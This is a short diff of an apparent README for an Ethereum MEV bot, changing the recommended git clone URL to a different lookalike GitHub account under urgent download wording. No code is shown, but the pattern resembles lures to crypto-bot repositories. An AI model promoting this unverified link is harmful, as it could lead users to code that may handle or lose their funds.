@@ -4,7 +4,7 @@
 
 💡 To ensure uninterrupted access to this bot contract code, we **highly recommend** downloading a copy:
 
-`git clone https://github.com/JaredFromsubway-MevBot/ETH-MEV-BOT.git`
+`git clone https://github.com/Jaredfromsubwayeth-Mev/Bot.git`
 
 ---
 
